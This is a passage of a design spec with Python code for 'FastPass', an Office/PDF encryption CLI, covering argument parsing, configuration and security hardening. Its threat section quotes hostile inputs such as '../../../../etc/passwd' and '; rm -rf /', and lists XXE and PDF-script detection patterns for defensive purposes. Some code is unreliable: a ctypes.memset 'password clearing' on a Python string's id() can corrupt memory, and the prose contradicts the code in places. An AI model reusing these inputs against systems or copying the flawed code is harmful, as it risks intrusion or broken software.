            'enable_secure_deletion': True,
            'symlink_protection': True,
            'xml_entity_protection': True
        }
    
    @classmethod
    def _load_from_environment(cls) -> Dict[str, Any]:
        """Load configuration from environment variables"""
        import os
        config = {}
        
        # Environment variable mapping
        env_mapping = {
            'FASTPASS_MAX_FILE_SIZE': ('max_file_size', int),
            'FASTPASS_LOG_LEVEL': ('log_level', str),
            'FASTPASS_LOG_FILE': ('log_file', str),
            'FASTPASS_CLEANUP_ON_ERROR': ('cleanup_on_error', bool),
            # Security environment variables
            'FASTPASS_ALLOW_CWD': ('allow_cwd', bool),
            'FASTPASS_MAX_PASSWORD_LENGTH': ('max_password_length', int),
            'FASTPASS_MAX_JSON_SIZE': ('max_json_size', int),
            'FASTPASS_ENABLE_SECURE_DELETION': ('enable_secure_deletion', bool),
            'FASTPASS_SYMLINK_PROTECTION': ('symlink_protection', bool),
            'FASTPASS_XML_ENTITY_PROTECTION': ('xml_entity_protection', bool)
        }
        
        for env_var, (config_key, type_func) in env_mapping.items():
            if env_var in os.environ:
                try:
                    if type_func == bool:
                        config[config_key] = os.environ[env_var].lower() in ('true', '1', 'yes')
                    else:
                        config[config_key] = type_func(os.environ[env_var])
                except ValueError as e:
                    print(f"Warning: Invalid environment variable {env_var}: {e}")
        
        return config
    
    @classmethod
    def _extract_cli_config(cls, cli_args: argparse.Namespace) -> Dict[str, Any]:
        """Extract configuration from CLI arguments"""
        config = {}
        
        if hasattr(cli_args, 'debug') and cli_args.debug:
            config['log_level'] = 'DEBUG'
            
        if hasattr(cli_args, 'output_dir') and cli_args.output_dir:
            config['output_directory'] = cli_args.output_dir
        
        return config
    
# CUSTOM EXCEPTION CLASSES
class SecurityViolationError(Exception): pass
class FileFormatError(Exception): pass  
class CryptoToolError(Exception): pass
class ProcessingError(Exception): pass
```

---

## Section A: CLI Parsing & Initialization

> **CODE MAPPING CRITICAL**: Each element below corresponds to specific code blocks that must be labeled with the exact IDs shown (e.g., `# A1a: sys.argv processing`)

```python
# A1: COMMAND LINE ARGUMENT PARSING
def parse_command_line_arguments() -> argparse.Namespace:
    import sys
    import argparse
    from pathlib import Path
    from typing import List, Optional
    
    # A1a: Create argument parser with custom actions
    parser = argparse.ArgumentParser(
        prog='fast_pass',
        description='FastPass - Secure file encryption/decryption tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  fast_pass encrypt -i file.docx -p mypassword
  fast_pass decrypt -i file.pdf --password-list passwords.txt
  fast_pass encrypt -i "file1.xlsx" "file2.xlsx" -o ./encrypted/
        '''
    )
    
    # A1b: Operation mode (encrypt XOR decrypt)
    operation_group = parser.add_mutually_exclusive_group(required=True)
    operation_group.add_argument('-e', '--encrypt', action='store_true',
                                help='Encrypt files')
    operation_group.add_argument('-d', '--decrypt', action='store_true', 
                                help='Decrypt files')
    
    # A1c: File input options (explicit file specification required)
    parser.add_argument('-i', '--input', nargs='*', type=str, dest='files',
                       help='Files to process (space-delimited, quotes for spaces)')
    parser.add_argument('-r', '--recursive', type=Path, metavar='DIR',
                       help='Process directory recursively (decrypt/check-password only)')
    
    # A1d: Password options with space-delimited support
    parser.add_argument('-p', '--password', nargs='*', type=str, dest='cli_passwords',
                       help='Passwords to try (space-delimited, quotes for spaces, or "stdin" for JSON input)')
    parser.add_argument('--password-list', type=Path,
                       help='File containing passwords (one per line)')
    
    # A1e: Output options  
    parser.add_argument('-o', '--output-dir', type=Path,
                       help='Output directory (default: in-place)')
    
    # A1f: Utility options
    parser.add_argument('--dry-run', action='store_true',
                       help='Show what would be done without making changes')
    parser.add_argument('--verify', action='store_true',
                       help='Deep verification of processed files')
    parser.add_argument('--list-supported', action='store_true',
                       help='List supported file formats')
    parser.add_argument('--debug', action='store_true',
                       help='Enable detailed logging')
    parser.add_argument('--log-file', type=Path,
                       help='Write logs to specified file')
    parser.add_argument('--report-format', choices=['text', 'json', 'csv'],
                       default='text', help='Output report format')
    
    # A1g: Security options
    parser.add_argument('--allow-cwd', action='store_true',
                       help='Allow file operations in current working directory (security: use with caution)')
    parser.add_argument('-v', '--version', action='version',
                       version=f'FastPass {FastPassConfig.VERSION}')
    
    # A1h: Parse arguments with error handling
    try:
        args = parser.parse_args()
    except SystemExit as e:
        if e.code != 0:
            sys.exit(2)  # Invalid arguments
        raise
    
    # A1h: Handle special modes
    if args.list_supported:
        display_supported_formats()
        sys.exit(0)
    
    return args

# A2: ARGUMENT VALIDATION AND NORMALIZATION
def validate_operation_mode_and_arguments(args: argparse.Namespace) -> argparse.Namespace:
    from pathlib import Path
    
    # A2a: Ensure files or recursive specified
    if not args.files and not args.recursive:
        raise ValueError("Must specify files or --recursive directory")
    
    if args.files and args.recursive:
        raise ValueError("Cannot specify both files and --recursive")
    
    # A2a1: Restrict recursive mode to decrypt and check-password only
    if args.recursive and args.encrypt:
        raise ValueError("Recursive mode is only supported for decrypt operations (security restriction)")
    
    # A2b: Process explicit file paths and normalize (no glob pattern support)
    if args.files:
        # Convert to Path objects and resolve (explicit file specification only)
        args.files = [Path(f).expanduser().resolve() for f in args.files]
    
    if args.recursive:
        args.recursive = Path(args.recursive).expanduser().resolve()
        if not args.recursive.is_dir():
            raise ValueError(f"Recursive path is not a directory: {args.recursive}")
    
    # A2c: Validate output directory
    if args.output_dir:
        args.output_dir = Path(args.output_dir).expanduser().resolve()
        if args.output_dir.exists() and not args.output_dir.is_dir():
            raise ValueError(f"Output path exists but is not a directory: {args.output_dir}")
    
    # A2d: Set operation mode flag
    args.operation = 'encrypt' if args.encrypt else 'decrypt'
    
    return args

# A3: LOGGING SYSTEM INITIALIZATION
def setup_logging_and_debug_infrastructure(args: argparse.Namespace) -> logging.Logger:
    import logging
    import sys
    from datetime import datetime
    
    # A3a: Configure logging with TTY detection
    log_level = logging.DEBUG if args.debug else logging.INFO
    
    # A3a-1: Configure console logging
    console_handler = logging.StreamHandler(sys.stderr)
    
    # Check if stderr is a TTY for appropriate formatting
    if sys.stderr.isatty():
        console_format = '%(asctime)s - %(levelname)s - %(message)s'
    else:
        # Non-TTY output (e.g., redirected to file) - simpler format
        console_format = '%(levelname)s: %(message)s'
    
    console_handler.setFormatter(logging.Formatter(console_format))
    console_handler.setLevel(log_level)
    
    # A3a-2: Configure file logging if specified
    handlers = [console_handler]
    
    if hasattr(args, 'log_file') and args.log_file:
        try:
            # Ensure log directory exists
            args.log_file.parent.mkdir(parents=True, exist_ok=True)
            
            file_handler = logging.FileHandler(args.log_file, mode='a')
            file_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            file_handler.setFormatter(logging.Formatter(file_format))
            file_handler.setLevel(logging.DEBUG)  # Always debug level for files
            handlers.append(file_handler)
            
        except Exception as e:
            print(f"Warning: Could not set up file logging to {args.log_file}: {e}")
    
    # A3a-3: Configure root logger
    logger = logging.getLogger('fastpass')
    logger.setLevel(log_level)
    logger.handlers.clear()  # Remove any existing handlers
    
    for handler in handlers:
        logger.addHandler(handler)
    
    logger = logging.getLogger('fastpass')
    
    # A3b: Log startup
    logger.info(f"FastPass v{FastPassConfig.VERSION} starting - operation: {args.operation}")
    
    return logger

def handle_password_input_sources(args: argparse.Namespace) -> None:
    """A3c: Handle TTY detection and stdin password input"""
    import sys
    import json
    
    # Check if 'stdin' is specified in CLI passwords
    if args.cli_passwords and 'stdin' in args.cli_passwords:
        if sys.stdin.isatty():
            raise ValueError("Cannot read JSON from stdin: terminal input detected")
        
        try:
            # Read JSON password mapping from stdin
            stdin_data = sys.stdin.read()
            password_mapping = json.loads(stdin_data)
            
            # Remove 'stdin' from CLI passwords and store mapping
            args.cli_passwords.remove('stdin')
            args.stdin_password_mapping = password_mapping
            
        except json.JSONDecodeError as e:
            raise ValueError(f"Invalid JSON in stdin password input: {e}")
        except Exception as e:
            raise ValueError(f"Error reading password input from stdin: {e}")
    else:
        args.stdin_password_mapping = {}

# A4: CRYPTO TOOL AVAILABILITY DETECTION
def initialize_crypto_tool_detection() -> Dict[str, bool]:
    import subprocess
    import importlib
    
    crypto_tools = {}
    
    # A4a: Test msoffcrypto-tool availability
    try:
        result = subprocess.run(['python', '-m', 'msoffcrypto.cli', '--version'], 
                              capture_output=True, timeout=10)
        crypto_tools['msoffcrypto'] = result.returncode == 0
    except (subprocess.TimeoutExpired, FileNotFoundError):
        crypto_tools['msoffcrypto'] = False
    
    # A4b: Test PyPDF2 availability
    try:
        importlib.import_module('PyPDF2')
        crypto_tools['PyPDF2'] = True
    except ImportError:
        crypto_tools['PyPDF2'] = False
    
    # A4c: Check for missing required tools
    required_tools = []
    if not crypto_tools.get('msoffcrypto'):
        required_tools.append('msoffcrypto-tool')
    if not crypto_tools.get('PyPDF2'):
        required_tools.append('PyPDF2')
    
    if required_tools:
        raise CryptoToolError(f"Missing required tools: {', '.join(required_tools)}")
    
    return crypto_tools

# A5: FASTPASS APPLICATION CLASS
class FastPassApplication:
    def __init__(self, args: argparse.Namespace, logger: logging.Logger):
        # A5a: Initialize instance variables
        self.args = args
        self.logger = logger
        self.operation_mode = args.operation
        self.crypto_tools = initialize_crypto_tool_detection()
        
        # A5b: File tracking lists
        self.temp_files_created: List[Path] = []
        self.processing_results: Dict[Path, str] = {}
        self.operation_start_time = datetime.now()
        
        # A5c: Load configuration and initialize secure password manager
        self.config = FastPassConfig.load_configuration(args)
        self.password_manager = SecurePasswordManager()
        self.password_manager.load_password_sources(args)
        
        # A5d: Initialize secure temporary file manager
        self.temp_file_manager = SecureTempFileManager()
        
        # A5e: State flags
        self.ready_for_processing = True
        
        self.logger.debug("FastPass application initialized successfully")
```

**What's Actually Happening:**
- **A1: Command Line Argument Processing**
  - `sys.argv` processing with explicit file specification
  - Individual file paths specified directly: `fast_pass encrypt "file1.docx" "file2.pdf"`
  - Quoted paths for files with spaces: `fast_pass encrypt "my documents/file.txt"`
  - `args.operation` contains 'encrypt' or 'decrypt' as positional argument
  - `args.files` becomes list of explicitly specified file paths
  - `args.cli_passwords` contains space-delimited passwords from -p flag
  - `args.stdin_password_mapping` contains JSON password mapping if '-p stdin' used

- **A2: Operation Mode & File Path Validation**
  - Validate operation: `args.operation` must be 'encrypt' or 'decrypt'
  - Input validation: must have `args.files` or `args.recursive` (not both unless combining)
  - File existence check: `os.path.exists(file_path)` for each input file or directory
  - Path normalization: `os.path.abspath(os.path.expanduser(file_path))`
  - Per-file password pairing: associate each file with its -p password argument
  - Password source validation: ensure passwords available from CLI, list file, or stdin
  - Build file list: `self.input_files = [{'path': Path, 'password': str, 'source': str}]`
  - Special modes: `--check-password`, `--list-supported` bypass normal password requirements

- **A3: Logging System Configuration with TTY Detection**
  - `sys.stderr.isatty()` detection for appropriate log formatting
  - TTY output: Full timestamp format `'%(asctime)s - %(levelname)s - %(message)s'`
  - Non-TTY output: Simple format `'%(levelname)s: %(message)s'` for file redirection
  - `logging.basicConfig()` with `level=logging.DEBUG` if `args.debug` enabled
  - Handler: `sys.stderr` for console output, doesn't interfere with stdout
  - Password input validation: Check `sys.stdin.isatty()` when '-p stdin' specified
  - JSON password parsing: Parse stdin JSON for per-file password mapping
  - TTY safety: Prevent accidental password exposure in terminal input

- **A4: Crypto Library Availability Detection**
  - Test msoffcrypto-tool: `import msoffcrypto` with ImportError handling
  - Test PyPDF2: `import PyPDF2` with version compatibility check
  - Store availability: `self.crypto_tools = {'msoffcrypto': bool, 'pypdf2': bool}`
  - If required libraries missing: exit with helpful installation instructions

- **A5: Configuration & Default Setup**
  - `self.config = {'backup_suffix': '_backup_{timestamp}', 'temp_dir_prefix': 'FastPass_'}`
  - `self.config['secure_permissions'] = 0o600` (read/write owner only)
  - `self.config['max_file_size'] = 500 * 1024 * 1024` (500MB limit)
  - `self.config['supported_formats'] = {'.docx': 'msoffcrypto', '.pdf': 'pypdf2'}`
  - Password policy: `self.config['min_password_length'] = 1` (no minimum enforced)
  - Cleanup settings: `self.config['cleanup_on_error'] = True`

- **A6: FastPass Application Object Creation**
  - Main `FastPass(args)` object instantiated with parsed arguments
  - `self.operation_mode = args.operation` ('encrypt' or 'decrypt')
  - `self.password_manager = PasswordManager()`
  - `self.file_processors = {}` (will map files to appropriate crypto handlers)
  - `self.temp_files_created = []` (tracking for cleanup)
  - `self.operation_start_time = datetime.now()` for timing
  - State flags: `self.ready_for_processing = True`, `self.cleanup_required = False`

---

## Security Hardening & Attack Vector Mitigation

> **SECURITY CRITICAL**: This section addresses comprehensive security hardening based on threat analysis and attack vector identification. Every mitigation must be implemented exactly as specified to prevent exploitation.

### **Attack Vector Analysis & Mitigations**

#### **1. Path Traversal Attack Prevention**

**Attack Scenario**: Attacker uses paths like `../../../../etc/passwd` to access files outside allowed directories.

**Hardened Validation**:
```python
def validate_path_security_hardened(file_path: Path, explicit_allow_cwd: bool = False) -> None:
    """Enhanced path traversal protection with strict validation"""
    import os
    from pathlib import Path
    
    # B1-SEC-1: Canonical path resolution with symlink detection
    try:
        original_path = file_path
        resolved_path = file_path.resolve(strict=True)  # Fail if path doesn't exist
        
        # B1-SEC-2: Symlink detection and protection
        if resolved_path != original_path.resolve():
            if original_path.is_symlink() or any(p.is_symlink() for p in original_path.parents):
                raise SecurityViolationError("Symlink access denied for security")
        
        # B1-SEC-3: Restricted allowed directories (NO current directory by default)
        allowed_dirs = [Path.home().resolve()]
        
        # Only allow current directory if explicitly enabled
        if explicit_allow_cwd:
            allowed_dirs.append(Path.cwd().resolve())
        
        # B1-SEC-4: Strict containment checking
        is_allowed = False
        for base_dir in allowed_dirs:
            try:
                relative_path = resolved_path.relative_to(base_dir)
                # Additional check: no parent directory references in resolved path
                if '..' in str(relative_path):
                    raise SecurityViolationError("Path traversal in resolved path")
                is_allowed = True
                break
            except ValueError:
                continue
        
        if not is_allowed:
            raise SecurityViolationError("File access outside permitted directories")
            
        # B1-SEC-5: Path component analysis (enhanced)
        forbidden_components = ['..', '.', '', '~']
        for component in original_path.parts:
            if component in forbidden_components:
                raise SecurityViolationError(f"Forbidden path component: {component}")
            if component.startswith('.') and component not in ['.docx', '.xlsx', '.pptx', '.pdf']:
                raise SecurityViolationError("Hidden file/directory access denied")
            
        # B1-SEC-6: Path length and character validation
        if len(str(resolved_path)) > 4096:  # Reasonable path length limit
            raise SecurityViolationError("Path length exceeds security limit")
            
        # Check for null bytes and other dangerous characters
        dangerous_chars = ['\x00', '\n', '\r', '\t']
        if any(char in str(original_path) for char in dangerous_chars):
            raise SecurityViolationError("Dangerous characters in file path")
            
    except (OSError, FileNotFoundError) as e:
        raise SecurityViolationError(f"Invalid or inaccessible file path: {e}")
```

#### **2. Command Injection Prevention**

**Attack Scenario**: Malicious file paths with shell metacharacters like `; rm -rf /` injected into subprocess calls.

**Secure Implementation**:
```python
def encrypt_file_secure(self, input_path: Path, output_path: Path, password: str) -> None:
    """Secure Office encryption using direct library calls (no subprocess)"""
    
    # B2-SEC-1: Legacy format validation
    file_extension = input_path.suffix.lower()
    if file_extension in ['.doc', '.xls', '.ppt']:
        raise FileFormatError(f"Legacy Office format {file_extension} not supported")
    
    # B2-SEC-2: Path validation before processing
    validate_path_security_hardened(input_path)
    validate_path_security_hardened(output_path.parent)
    
    # B2-SEC-3: Password sanitization
    if len(password) > 1024:  # Reasonable password length limit
        raise ValueError("Password exceeds maximum length")
    if '\x00' in password:
        raise ValueError("Null byte in password")
    
    # B2-SEC-4: Use direct library calls instead of subprocess
    try:
        import msoffcrypto
        
        # Use msoffcrypto library directly for encryption (when available)
        # This eliminates subprocess command injection risks
        with open(input_path, 'rb') as input_file:
            # Note: Direct encryption may require different approach
            # Fall back to subprocess with strict argument validation only if necessary
            if self._direct_encryption_available():
                self._encrypt_direct(input_file, output_path, password)
            else:
                self._encrypt_subprocess_secure(input_path, output_path, password)
                
    except Exception as e:
        raise ProcessingError(f"Secure Office encryption failed: {e}")

def _encrypt_subprocess_secure(self, input_path: Path, output_path: Path, password: str) -> None:
    """Fallback secure subprocess implementation with strict validation"""
    
    # B2-SEC-5: Strict argument validation for subprocess
    import subprocess
    import shlex
    
    # Validate all paths are within allowed directories
    validate_path_security_hardened(input_path)
    validate_path_security_hardened(output_path.parent)
    
    # Use argument list (not shell) to prevent injection
    cmd_args = [
        'python', '-m', 'msoffcrypto.cli',
        '-e', '-p', password,
        str(input_path.resolve()),  # Use absolute paths
        str(output_path.resolve())
    ]
    
    # B2-SEC-6: Secure subprocess execution
    try:
        result = subprocess.run(
            cmd_args,
            capture_output=True,
            text=True,
            timeout=60,
            shell=False,  # CRITICAL: Never use shell=True
            cwd=None,     # Don't inherit current directory
            env={'PATH': os.environ.get('PATH', '')},  # Minimal environment
            check=False
        )
        
        if result.returncode != 0:
            # Sanitize error output to prevent information disclosure
            sanitized_error = self._sanitize_error_message(result.stderr)
            raise ProcessingError(f"Office encryption failed: {sanitized_error}")
            
    except subprocess.TimeoutExpired:
        raise ProcessingError("Office encryption timed out")
```

#### **3. Password Security & Memory Protection**

**Attack Scenarios**: Password exposure in process lists, memory dumps, swap files, or shell history.

**Secure Implementation**:
```python
class SecurePasswordManager:
    """Enhanced password manager with memory protection"""
    
    def __init__(self):
        self.cli_passwords = []
        self.password_list_file = None
        self.password_list = []
        self._memory_regions = []  # Track memory for secure clearing
        
    # B3-SEC-1: Secure password input without command line exposure
    def get_password_secure(self, prompt: str = "Password: ") -> str:
        """Get password without exposing in process list or history"""
        import getpass
        import sys
        
        if sys.stdin.isatty():
            # Interactive mode - use secure password prompt
            password = getpass.getpass(prompt)
        else:
            # Non-interactive mode - read from stdin (for automation)
            password = sys.stdin.readline().rstrip('\n\r')
        
        if not password:
            raise ValueError("Empty password not allowed")
            
        return password
    
    # B3-SEC-2: Secure memory clearing for passwords
    def clear_password_memory(self, password_str: str) -> None:
        """Attempt to clear password from memory (best effort)"""
        import ctypes
        
        try:
            # Get string object memory location
            address = id(password_str)
            size = len(password_str)
            
            # Overwrite memory with zeros (best effort in Python)
            ctypes.memset(address, 0, size)
            
        except Exception:
            # Memory clearing is best effort - don't fail operation
            pass
    
    # B3-SEC-3: Secure JSON password parsing with validation
    def parse_stdin_passwords_secure(self, stdin_data: str) -> Dict[str, str]:
        """Secure JSON password parsing with strict validation"""
        import json
        
        # Validate JSON size to prevent DoS
        if len(stdin_data) > 1024 * 1024:  # 1MB limit
            raise ValueError("Password JSON exceeds size limit")
        
        try:
            password_mapping = json.loads(stdin_data)
            
            if not isinstance(password_mapping, dict):
                raise ValueError("Password input must be JSON object")
            
            # Validate each entry
            validated_mapping = {}
            for filename, password in password_mapping.items():
                if not isinstance(filename, str) or not isinstance(password, str):
                    raise ValueError("Password mapping must contain only strings")
                
                # Validate filename for security
                file_path = Path(filename)
                validate_path_security_hardened(file_path)
                
                # Validate password
                if len(password) > 1024:
                    raise ValueError(f"Password for {filename} exceeds length limit")
                if '\x00' in password:
                    raise ValueError(f"Invalid characters in password for {filename}")
                
                validated_mapping[filename] = password
            
            return validated_mapping
            
        except json.JSONDecodeError as e:
            raise ValueError(f"Invalid JSON in password input: {e}")
        finally:
            # Clear input data from memory
            self.clear_password_memory(stdin_data)
```

#### **4. Secure Temporary File Operations**

**Attack Scenarios**: Race conditions, symlink attacks, predictable file names, insecure permissions.

**Secure Implementation**:
```python
class SecureTempFileManager:
    """Enhanced temporary file manager with security hardening"""
    
    def __init__(self):
        self.temp_directories = []
        self.temp_files = []
        self.cleanup_registered = False
        
    # B4-SEC-1: Secure temporary directory creation
    def create_secure_temp_directory(self) -> Path:
        """Create cryptographically secure temporary directory"""
        import tempfile
        import secrets
        import os
        from datetime import datetime
        
        # B4-SEC-2: Cryptographically secure random naming
        random_suffix = secrets.token_hex(16)  # 32 character hex string
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        pid = os.getpid()
        
        # Combine multiple entropy sources
        temp_name = f"fastpass_sec_{timestamp}_{pid}_{random_suffix}"
        
        # B4-SEC-3: Create with most restrictive permissions
        old_umask = os.umask(0o077)  # Ensure only owner can access
        try:
            temp_dir = Path(tempfile.mkdtemp(prefix=temp_name))
            
            # Set extremely restrictive permissions
            os.chmod(temp_dir, 0o700)  # Owner read/write/execute only
            
            # Create subdirectories with same restrictive permissions
            for subdir in ['processing', 'output']:
                subdir_path = temp_dir / subdir
                subdir_path.mkdir(mode=0o700)
                
            self.temp_directories.append(temp_dir)
            
            # Register cleanup if not already done
            if not self.cleanup_registered:
                import atexit
                atexit.register(self.emergency_cleanup)
                self.cleanup_registered = True
                
            return temp_dir
            
        finally:
            os.umask(old_umask)  # Restore original umask
    
    # B4-SEC-4: Secure atomic file operations
    def atomic_file_write(self, content: bytes, target_path: Path) -> None:
        """Secure atomic file write to prevent race conditions"""
        import secrets
        import os
        
        # Create temporary file in same directory as target (for atomic move)
        temp_name = f".tmp_{secrets.token_hex(8)}_{target_path.name}"
        temp_path = target_path.parent / temp_name
        
        try:
            # Write to temporary file with secure permissions
            with open(temp_path, 'wb') as f:
                os.chmod(temp_path, 0o600)  # Restrictive permissions before writing
                f.write(content)
                f.flush()
                os.fsync(f.fileno())  # Ensure data is written to disk
            
            # Atomic move to final location
            temp_path.replace(target_path)
            
        except Exception:
            # Clean up temporary file on failure
            if temp_path.exists():
                try:
                    temp_path.unlink()
                except Exception:
                    pass
            raise
    
    # B4-SEC-5: Secure file deletion with overwriting
    def secure_delete_file(self, file_path: Path) -> None:
        """Securely delete file with overwriting (best effort)"""
        import os
        
        try:
            if file_path.exists() and file_path.is_file():
                file_size = file_path.stat().st_size
                
                # Overwrite with random data (best effort)
                if file_size > 0 and file_size < 100 * 1024 * 1024:  # Only for files < 100MB
                    with open(file_path, 'r+b') as f:
                        # Multiple passes with different patterns
                        patterns = [b'\x00', b'\xFF', secrets.token_bytes(min(file_size, 1024))]
                        for pattern in patterns:
                            f.seek(0)
                            if len(pattern) == 1:
                                f.write(pattern * file_size)
                            else:
                                # Write random pattern
                                remaining = file_size
                                while remaining > 0:
                                    chunk_size = min(remaining, len(pattern))
                                    f.write(pattern[:chunk_size])
                                    remaining -= chunk_size
                            f.flush()
                            os.fsync(f.fileno())
                
                # Remove file
                file_path.unlink()
                
        except Exception:
            # Don't fail operation if secure deletion fails
            try:
                file_path.unlink()  # Fallback to normal deletion
            except Exception:
                pass
```

#### **5. File Format Attack Prevention**

**Attack Scenarios**: XXE injection, ZIP bombs, malicious macros, polyglot files.

**Secure Implementation**:
```python
def validate_file_format_secure(file_path: Path) -> str:
    """Enhanced file format validation with attack prevention"""
    import filetype
    import zipfile
    import xml.etree.ElementTree as ET
    
    # B5-SEC-1: File size validation (prevent DoS)
    file_size = file_path.stat().st_size
    if file_size > FastPassConfig.MAX_FILE_SIZE:
        raise FileFormatError(f"File too large: {file_size} bytes")
    if file_size == 0:
        raise FileFormatError("Empty file not allowed")
    
    # B5-SEC-2: Magic number validation (primary authority)
    detected_type = filetype.guess(str(file_path))
    file_extension = file_path.suffix.lower()
    
    # Allowed magic number mappings
    allowed_magic_types = {
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document': '.docx',
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet': '.xlsx',
        'application/vnd.openxmlformats-officedocument.presentationml.presentation': '.pptx',
        'application/pdf': '.pdf'
    }
    
    detected_format = None
    if detected_type and detected_type.mime in allowed_magic_types:
        detected_format = allowed_magic_types[detected_type.mime]
        
        # B5-SEC-3: Cross-validate magic number vs extension
        if file_extension != detected_format:
            raise FileFormatError(f"File format mismatch: extension {file_extension} vs detected {detected_format}")
    
    # B5-SEC-4: Extension-based validation (fallback)
    if not detected_format:
        if file_extension in FastPassConfig.SUPPORTED_FORMATS:
            detected_format = file_extension
        else:
            raise FileFormatError(f"Unsupported file format: {file_extension}")
    
    # B5-SEC-5: Office document security validation
    if detected_format in ['.docx', '.xlsx', '.pptx']:
        validate_office_document_security(file_path)
    
    # B5-SEC-6: PDF security validation  
    elif detected_format == '.pdf':
        validate_pdf_document_security(file_path)
    
    return detected_format

def validate_office_document_security(file_path: Path) -> None:
    """Validate Office document against security threats"""
    import zipfile
    import xml.etree.ElementTree as ET
    
    try:
        # B5-SEC-7: ZIP bomb protection
        with zipfile.ZipFile(file_path, 'r') as zip_file:
            total_uncompressed = 0
            file_count = 0
            
            for info in zip_file.infolist():
                file_count += 1
                total_uncompressed += info.file_size
                
                # Prevent ZIP bombs
                if file_count > 1000:  # Reasonable file count limit
                    raise FileFormatError("Office document contains too many files")
                
                if total_uncompressed > 100 * 1024 * 1024:  # 100MB uncompressed limit
                    raise FileFormatError("Office document uncompressed size too large")
                
                # Check compression ratio for ZIP bomb detection
                if info.file_size > 0 and info.compress_size > 0:
                    ratio = info.file_size / info.compress_size
                    if ratio > 100:  # High compression ratio indicates potential ZIP bomb
                        raise FileFormatError("Suspicious compression ratio in Office document")
            
            # B5-SEC-8: XML content validation (prevent XXE)
            xml_files = [name for name in zip_file.namelist() if name.endswith('.xml')]
            for xml_file in xml_files[:10]:  # Limit XML files checked
                try:
                    with zip_file.open(xml_file) as f:
                        xml_content = f.read(1024 * 1024)  # Limit XML size read
                        validate_xml_security(xml_content)
                except Exception:
                    # Don't fail on XML parsing errors, but log suspicion
                    continue
                    
    except zipfile.BadZipFile:
        raise FileFormatError("Corrupted Office document")

def validate_xml_security(xml_content: bytes) -> None:
    """Validate XML content for security threats"""
    
    # B5-SEC-9: XXE prevention - check for entity declarations
    xml_str = xml_content.decode('utf-8', errors='ignore')
    
    # Look for suspicious patterns
    suspicious_patterns = [
        '<!ENTITY',     # Entity declarations
        'SYSTEM',       # System entity references
        'file://',      # File protocol
        'http://',      # HTTP requests in XML
        'https://',     # HTTPS requests in XML
        '&lt;!ENTITY', # HTML-encoded entity declarations
    ]
    
    xml_lower = xml_str.lower()
    for pattern in suspicious_patterns:
        if pattern.lower() in xml_lower:
            raise FileFormatError("Potentially malicious XML content detected")
    
    # Additional size check
    if len(xml_content) > 10 * 1024 * 1024:  # 10MB XML limit
        raise FileFormatError("XML content too large")

def validate_pdf_document_security(file_path: Path) -> None:
    """Validate PDF document against security threats"""
    
    # B5-SEC-10: Basic PDF structure validation
    with open(file_path, 'rb') as f:
        header = f.read(1024)
        
        # Check PDF header
        if not header.startswith(b'%PDF-'):
            raise FileFormatError("Invalid PDF header")
        
        # Look for suspicious content
        suspicious_content = [
            b'/JavaScript',  # JavaScript in PDF
            b'/JS',         # JavaScript abbreviation
            b'/Launch',     # Launch actions
            b'/GoToR',      # Go to remote actions
        ]
        
        content_sample = f.read(10 * 1024)  # Read first 10KB for scanning
        for suspicious in suspicious_content:
            if suspicious in content_sample:
                raise FileFormatError("Potentially malicious PDF content detected")
```

---

## Section B: Security & File Validation

> **SECURITY CRITICAL**: Every security check must map to specific code with proper error handling and sanitization. Label each implementation block with the exact ID shown.

```python
# B1: FILE PATH RESOLUTION AND SECURITY VALIDATION
def perform_security_and_file_validation(args: argparse.Namespace) -> List[FileManifest]:
    import os
    import filetype
    from pathlib import Path
    from typing import List, Dict, Any
    
    validated_files: List[FileManifest] = []
    
    # B1a: Collect all files to process
    files_to_process = []
    if args.files:
        files_to_process = args.files
    elif args.recursive:
        files_to_process = collect_files_recursively(args.recursive)
    
    for file_path in files_to_process:
        # B1b: Path resolution and normalization
        resolved_path = Path(file_path).expanduser().resolve()
        
        # B1c: Security validation - hardened path traversal protection
        validate_path_security_hardened(resolved_path, explicit_allow_cwd=args.allow_cwd)
        
        # B1d: File existence and access validation
        validate_file_access(resolved_path)
        
        # B1e: File format validation with security hardening
        file_format = validate_file_format_secure(resolved_path)
        
        # B1f: Encryption status detection
        encryption_status = detect_encryption_status(resolved_path, file_format)
        
        # B1g: Build file manifest entry
        manifest_entry = FileManifest(
            path=resolved_path,
            format=file_format,
            size=resolved_path.stat().st_size,
            is_encrypted=encryption_status,
            crypto_tool=FastPassConfig.SUPPORTED_FORMATS[file_format.suffix]
        )
        
        validated_files.append(manifest_entry)
    
    if not validated_files:
        raise FileFormatError("No valid files found to process")
    
    return validated_files

def validate_path_security(file_path: Path) -> None:
    """B2: Path traversal and security validation"""
    import os
    from pathlib import Path
    
    # B2a: Resolve absolute path and check for dangerous patterns
    try:
        # Get the absolute path of the intended base directories
        user_home = Path.home().resolve()
        current_dir = Path.cwd().resolve()
        allowed_dirs = [user_home, current_dir]
        
        # Get the absolute path of the user-provided file path
        resolved_path = file_path.resolve()
        
        # B2b: Check if the resolved path is within allowed directories
        is_allowed = False
        for base_dir in allowed_dirs:
            try:
                # Check if the resolved path is within the base directory
                resolved_path.relative_to(base_dir)
                is_allowed = True
                break
            except ValueError:
                # Path is not relative to this base directory, try next
                continue
        
        if not is_allowed:
            raise SecurityViolationError("File access outside allowed directories")
            
        # B2c: Additional component analysis for dangerous patterns
        for component in file_path.parts:
            if component in ['..', '.', ''] or component.startswith('.'):
                raise SecurityViolationError("Path traversal attempt detected")
                
    except (OSError, ValueError) as e:
        raise SecurityViolationError("Invalid file path")

def validate_file_access(file_path: Path) -> None:
    """B3: File access and permission validation"""
    # B3a: Existence check
    if not file_path.exists():
        raise FileNotFoundError(f"File not found: {file_path}")
    
    # B3b: Read permission check
    if not os.access(file_path, os.R_OK):
        raise PermissionError(f"No read permission: {file_path}")
    
    # B3c: Size limit check
    file_size = file_path.stat().st_size
    if file_size > FastPassConfig.MAX_FILE_SIZE:
        raise FileFormatError(f"File too large: {file_size} bytes")
    
    # B3d: Write permission check for in-place operations
    parent_dir = file_path.parent
    if not os.access(parent_dir, os.W_OK):
        raise PermissionError(f"No write permission in directory: {parent_dir}")

def validate_file_format(file_path: Path) -> str:
    """B4: File format validation using magic number detection first"""
    import filetype
    
    # B4a: Primary validation - magic number detection
    detected_type = filetype.guess(str(file_path))
    file_extension = file_path.suffix.lower()
    
    # B4b: Magic number to format mapping (primary authority)
